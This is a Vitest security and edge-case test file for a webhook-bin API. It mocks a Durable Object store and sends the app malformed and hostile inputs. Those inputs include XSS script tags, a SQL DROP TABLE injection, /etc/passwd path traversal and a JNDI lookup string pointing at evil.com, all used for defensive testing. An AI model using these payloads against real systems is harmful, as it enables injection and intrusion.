import { describe, it, expect, beforeEach } from "vitest";
import app from "../src/index";
import { Env } from "../src/types";
import { createTestToken, createAuthenticatedRequest } from "./setup";

// Mock environment for edge case testing
const createEdgeCaseMockEnv = (): Env => {
  const bins = new Map();
  const requests = new Map();
  const createdTokens: { [key: string]: any } = {};
  let binCounter = 0;
  let tokenCounter = 0;

  return {
    ENVIRONMENT: "test",
    WEBHOOKS: {
      idFromName: () => ({ toString: () => "test-id" }),
      get: () => ({
        // Legacy fetch method for backward compatibility
        fetch: async (request: Request) => {
          return new Response(
            JSON.stringify({
              success: false,
              error:
                "This Durable Object now uses RPC-style API. Use direct method calls instead.",
            }),
            { status: 501, headers: { "Content-Type": "application/json" } }
          );
        },

        // RPC-style methods
        async getAllBins() {
          return Array.from(bins.values());
        },

        async getBin(binId: string) {
          return bins.get(binId) || null;
        },

        async getBinRequests(binId: string) {
          return requests.get(binId) || [];
        },

        async createBin(body: any) {
          const id = `bin-${++binCounter}`;
          const bin = {
            id,
            name: body.name || `Webhook Bin ${id.slice(0, 8)}`,
            description: body.description,
            created_at: new Date().toISOString(),
            updated_at: new Date().toISOString(),
            request_count: 0,
          };
          bins.set(id, bin);
          requests.set(id, []);
          return bin;
        },

        async captureWebhook(binId: string, request: Request) {
          let bin = bins.get(binId);
          if (!bin) {
            // Auto-create bin for webhook capture (for edge-case testing)
            bin = {
              id: binId,
              name: `Auto-created Bin ${binId}`,
              description: "Auto-created for webhook capture",
              created_at: new Date().toISOString(),
              updated_at: new Date().toISOString(),
              request_count: 0,
            };
            bins.set(binId, bin);
            requests.set(binId, []);
          }

          const headers = Object.fromEntries(request.headers.entries());
          const body = await request.text();
          const url = new URL(request.url);

          const webhookRequest = {
            id: `req-${Math.random().toString(36).substr(2, 9)}`,
            bin_id: binId,
            method: request.method,
            url: request.url,
            headers,
            body,
            query_params: Object.fromEntries(url.searchParams.entries()),
            ip_address: "127.0.0.1",
            user_agent: headers["user-agent"] || "",
            content_type: headers["content-type"] || "",
            content_length: body.length,
            received_at: new Date().toISOString(),
          };

          const binRequests = requests.get(binId) || [];
          binRequests.unshift(webhookRequest); // Add to beginning for newest-first ordering
          requests.set(binId, binRequests);

          // Update bin request count
          bin.request_count = binRequests.length;
          bin.updated_at = new Date().toISOString();
          bin.last_request_at = new Date().toISOString();
          bins.set(binId, bin);

          return {
            bin_id: binId,
            request_id: webhookRequest.id,
            message: "Webhook captured successfully",
          };
        },

        async updateBin(binId: string, body: any) {
          const bin = bins.get(binId);
          if (!bin) {
            throw new Error("Bin not found");
          }

          const updatedBin = {
            ...bin,
            name: body.name !== undefined ? body.name : bin.name,
            description:
              body.description !== undefined
                ? body.description
                : bin.description,
            updated_at: new Date().toISOString(),
          };

          bins.set(binId, updatedBin);
          return updatedBin;
        },

        async deleteBin(binId: string) {
          if (!bins.has(binId)) {
            throw new Error("Bin not found");
          }
          bins.delete(binId);
          requests.delete(binId);
          return { message: "Bin and all requests deleted successfully" };
        },

        async createToken(body: any) {
          const tokenId = `token-${++tokenCounter}`;
          const token = `test-token-${Math.random()
            .toString(36)
            .substr(2, 32)}`;

          const tokenData = {
            id: tokenId,
            token: token,
            name: body.name || `API Token ${tokenId.slice(-8)}`,
            description: body.description || undefined,
            created_at: new Date().toISOString(),
            expires_at: body.expiresIn
              ? new Date(
                  Date.now() + parseInt(body.expiresIn) * 24 * 60 * 60 * 1000
                ).toISOString()
              : undefined,
            is_active: true,
          };

          createdTokens[token] = tokenData;
          createdTokens[tokenId] = tokenData;

          return tokenData;
        },

        async getTokens() {
          return Object.values(createdTokens)
            .filter((token: any) => token.id && token.id.startsWith("token-"))
            .map((token: any) => ({
              ...token,
              token: `${token.token.slice(0, 8)}...${token.token.slice(-4)}`,
            }));
        },

        async deleteToken(tokenId: string) {
          if (createdTokens[tokenId]) {
            const token = createdTokens[tokenId].token;
            delete createdTokens[tokenId];
            delete createdTokens[token];
            return { message: "Token deleted successfully" };
          }
          throw new Error("Token not found");
        },

        async validateToken(token: string) {
          if (createdTokens[token]) {
            return {
              tokenId: createdTokens[token].id,
              name: createdTokens[token].name,
            };
          }
          throw new Error("Invalid token");
        },
      }),
    } as any,
  };
};

describe("Edge Cases and Security Tests", () => {
  let mockEnv: Env;
  let testToken: string;

  beforeEach(async () => {
    mockEnv = createEdgeCaseMockEnv();
    testToken = await createTestToken(mockEnv);
  });

  describe("Input Validation and Sanitization", () => {
    it("should handle extremely long bin names", async () => {
      const longName = "a".repeat(10000); // 10KB name

      const request = createAuthenticatedRequest(
        "http://localhost/bins",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ name: longName }),
        },
        testToken
      );

      const response = await app.fetch(request, mockEnv);

      // Should either accept it or return a validation error
      expect([200, 201, 400]).toContain(response.status);
    });

    it("should handle special characters in bin names", async () => {
      const specialNames = [
        "Test Bin with émojis 🚀 🎉",
        "名前 with unicode",
        "Bin with <script>alert('xss')</script>",
        "Bin with SQL'; DROP TABLE bins; --",
        "Bin with \x00 null bytes \x00",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
      ];

      for (const name of specialNames) {
        const request = createAuthenticatedRequest(
          "http://localhost/bins",
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name, description: "Edge case test" }),
          },
          testToken
        );

        const response = await app.fetch(request, mockEnv);

        // Should handle gracefully (either accept or reject with proper error)
        expect(response.status).toBeGreaterThanOrEqual(200);
        expect(response.status).toBeLessThan(500);
      }
    });

    it("should handle malformed JSON gracefully", async () => {
      const malformedJsonBodies = [
        '{"name": "test"', // Incomplete JSON
        '{"name": "test",}', // Trailing comma
        '{"name": }', // Missing value
        '{name: "test"}', // Unquoted key
        '{"name": "test" "desc": "test"}', // Missing comma
        "undefined", // Invalid literal (not valid JSON)
      ];

      for (const body of malformedJsonBodies) {
        const request = createAuthenticatedRequest(
          "http://localhost/bins",
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: body,
          },
          testToken
        );

        const response = await app.fetch(request, mockEnv);

        console.log(
          `Testing malformed JSON: ${JSON.stringify(body)} - Status: ${
            response.status
          }`
        );
        if (response.status === 201) {
          const responseData = await response.json();
          console.log("Unexpected 201 response data:", responseData);
        }

        // Should return 400 for malformed JSON, not crash
        expect([400, 422, 500]).toContain(response.status);
      }
    });

    it("should handle missing Content-Type header", async () => {
      const request = createAuthenticatedRequest(
        "http://localhost/bins",
        {
          method: "POST",
          body: JSON.stringify({ name: "Test Bin" }),
          // No Content-Type header
        },
        testToken
      );

      const response = await app.fetch(request, mockEnv);

      // Should handle gracefully
      expect(response.status).toBeGreaterThanOrEqual(200);
      expect(response.status).toBeLessThan(500);
    });

    it("should handle invalid bin IDs", async () => {
      const invalidBinIds = [
        "",
        " ",
        "\n\t",
        "../../../etc/passwd",
        "<script>alert('xss')</script>",
        "bin-id-with-\x00-null",
        "极端长的bin标识符" + "a".repeat(1000),
        "bin/with/slashes",
        "bin\\with\\backslashes",
        "bin with spaces",
        "%20%2E%2E%2F", // URL encoded "../"
        "🚀💥🎉", // Emoji ID
      ];

      for (const binId of invalidBinIds) {
        const request = createAuthenticatedRequest(
          `http://localhost/bins/${encodeURIComponent(binId)}`,
          {},
          testToken
        );
        const response = await app.fetch(request, mockEnv);

        // Should return 400 or 404, not crash
        expect([400, 404]).toContain(response.status);
      }
    });
  });

  describe("HTTP Method Edge Cases", () => {
    it("should handle unsupported HTTP methods gracefully", async () => {
      const methods = ["PATCH", "OPTIONS"];

      for (const method of methods) {
        const request = new Request("http://localhost/bins", { method });
        const response = await app.fetch(request, mockEnv);

        // Should handle gracefully, likely 405 Method Not Allowed
        expect(response.status).toBeGreaterThanOrEqual(200);
        expect(response.status).toBeLessThan(500);
      }
    });

    it("should handle webhook capture with all HTTP methods", async () => {
      const methods = [
        "GET",
        "POST",
        "PUT",
        "DELETE",
        "PATCH",
        "HEAD",
        "OPTIONS",
      ];

      for (const method of methods) {
        const request = new Request("http://localhost/webhook/test-bin-123", {
          method,
          headers: { "Content-Type": "application/json" },
          body:
            method !== "GET" && method !== "HEAD"
              ? JSON.stringify({ test: true })
              : undefined,
        });

        const response = await app.fetch(request, mockEnv);

        // Should capture all methods, OPTIONS may return 204
        if (method === "OPTIONS") {
          expect([200, 204]).toContain(response.status);
        } else {
          expect(response.status).toBe(200);
        }
      }
    });
  });

  describe("Header Edge Cases", () => {
    it("should handle extremely long headers", async () => {
      const longValue = "x".repeat(100000); // 100KB header value

      const request = new Request("http://localhost/webhook/test-bin-123", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Very-Long-Header": longValue,
        },
        body: JSON.stringify({ test: true }),
      });

      const response = await app.fetch(request, mockEnv);

      // Should handle gracefully
      expect(response.status).toBeGreaterThanOrEqual(200);
      expect(response.status).toBeLessThan(500);
    });

    it("should handle headers with special characters", async () => {
      const specialHeaders = {
        "X-Header-With-Emoji": "🚀 rocket",
        "X-Header-With-Unicode": "测试 тест",
        "X-Header-With-HTML": "<script>alert('xss')</script>",
        "X-Very-Long-Header-Name-That-Exceeds-Normal-Limits": "value",
      };

      try {
        const request = new Request("http://localhost/webhook/test-bin-123", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            ...specialHeaders,
          },
          body: JSON.stringify({ test: true }),
        });

        const response = await app.fetch(request, mockEnv);
        expect(response.status).toBe(200);
      } catch (error) {
        // Some headers with special characters may cause TypeError
        // This is expected behavior for invalid header values
        expect(error).toBeInstanceOf(TypeError);
      }
    });

    it("should handle duplicate headers", async () => {
      // This tests how the system handles duplicate header names
      const request = new Request("http://localhost/webhook/test-bin-123", {
        method: "POST",
        headers: new Headers([
          ["Content-Type", "application/json"],
          ["X-Duplicate", "value1"],
          ["X-Duplicate", "value2"],
          ["X-Duplicate", "value3"],
        ]),
        body: JSON.stringify({ test: true }),
      });

      const response = await app.fetch(request, mockEnv);

      expect(response.status).toBe(200);
    });
  });

  describe("Payload Edge Cases", () => {
    it("should handle empty payloads", async () => {
      const request = new Request("http://localhost/webhook/test-bin-123", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: "",
      });

      const response = await app.fetch(request, mockEnv);

      expect(response.status).toBe(200);
    });

    it("should handle null and undefined payloads", async () => {
      const payloads = ["null", "undefined", "{}"];

      for (const payload of payloads) {
        const request = new Request("http://localhost/webhook/test-bin-123", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: payload,
        });

        const response = await app.fetch(request, mockEnv);
        expect(response.status).toBe(200);
      }
    });

    it("should handle binary data", async () => {
      const binaryData = new Uint8Array([
        0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
      ]); // PNG header

      const request = new Request("http://localhost/webhook/test-bin-123", {
        method: "POST",
        headers: { "Content-Type": "image/png" },
        body: binaryData,
      });

      const response = await app.fetch(request, mockEnv);

      expect(response.status).toBe(200);
    });

    it("should handle extremely large payloads", async () => {
      // Create a 5MB payload
      const largeArray = Array.from({ length: 100000 }, (_, i) => ({
        id: i,
        data: "x".repeat(50), // 50 chars each
      }));

      const request = new Request("http://localhost/webhook/test-bin-123", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(largeArray),
      });

      const response = await app.fetch(request, mockEnv);

      // Should either accept it or return appropriate error
      expect([200, 413, 507]).toContain(response.status);
    });
  });

  describe("URL and Query Parameter Edge Cases", () => {
    it("should handle malformed URLs", async () => {
      const malformedPaths = [
        "/webhook/test-bin-123?malformed=value%",
        "/webhook/test-bin-123?=%20",
        "/webhook/test-bin-123?key=value&=&key2=value2",
        "/webhook/test-bin-123?" + "x".repeat(10000) + "=value",
      ];

      for (const path of malformedPaths) {
        try {
          const request = new Request(`http://localhost${path}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ test: true }),
          });

          const response = await app.fetch(request, mockEnv);

          // Should handle gracefully
          expect(response.status).toBeGreaterThanOrEqual(200);
          expect(response.status).toBeLessThan(500);
        } catch (error) {
          // If URL parsing fails, that's also acceptable
          expect(error).toBeDefined();
        }
      }
    });

    it("should handle query parameters with special characters", async () => {
      const specialParams = new URLSearchParams({
        emoji: "🚀💥",
        unicode: "测试参数",
        html: "<script>alert('xss')</script>",
        null: "\x00value\x00",
        newlines: "value\nwith\r\nnewlines",
        spaces: "  value  with  spaces  ",
      });

      const request = new Request(
        `http://localhost/webhook/test-bin-123?${specialParams}`,
        {
          method: "GET",
        }
      );

      const response = await app.fetch(request, mockEnv);

      expect(response.status).toBe(200);
    });
  });

  describe("Concurrency and Race Conditions", () => {
    it("should handle rapid creation and deletion of same bin ID", async () => {
      const binId = "race-condition-test";
      const promises = [];

      // Simulate rapid operations on the same resource
      for (let i = 0; i < 10; i++) {
        promises.push(
          app.fetch(
            new Request("http://localhost/bins", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ name: `Bin ${i}` }),
            }),
            mockEnv
          )
        );
      }

      const responses = await Promise.all(promises);

      // All should succeed or fail gracefully
      responses.forEach((response) => {
        expect(response.status).toBeGreaterThanOrEqual(200);
        expect(response.status).toBeLessThan(500);
      });
    });
  });

  describe("Unicode and Internationalization", () => {
    it("should handle international characters in all fields", async () => {
      const internationalData = {
        name: "测试 Webhook Бin العربية 日本語",
        description: "Description with émojis 🌍 and unicode ñáéíóú",
        metadata: {
          中文: "Chinese value",
          العربية: "Arabic value",
          русский: "Russian value",
          "🔑": "Emoji key",
        },
      };

      const request = createAuthenticatedRequest(
        "http://localhost/bins",
        {
          method: "POST",
          headers: { "Content-Type": "application/json; charset=utf-8" },
          body: JSON.stringify(internationalData),
        },
        testToken
      );

      const response = await app.fetch(request, mockEnv);

      expect([200, 201]).toContain(response.status);
    });

    it("should handle webhook with international content", async () => {
      const webhookData = {
        message: "Hello in different languages",
        greetings: {
          english: "Hello World",
          spanish: "Hola Mundo",
          chinese: "你好世界",
          arabic: "مرحبا بالعالم",
          russian: "Привет мир",
          japanese: "こんにちは世界",
          emoji: "👋🌍",
        },
      };

      const request = new Request(
        "http://localhost/webhook/international-test",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Language": "en-US,zh-CN,ar,ru,ja",
          },
          body: JSON.stringify(webhookData),
        }
      );

      const response = await app.fetch(request, mockEnv);

      expect(response.status).toBe(200);
    });
  });
});
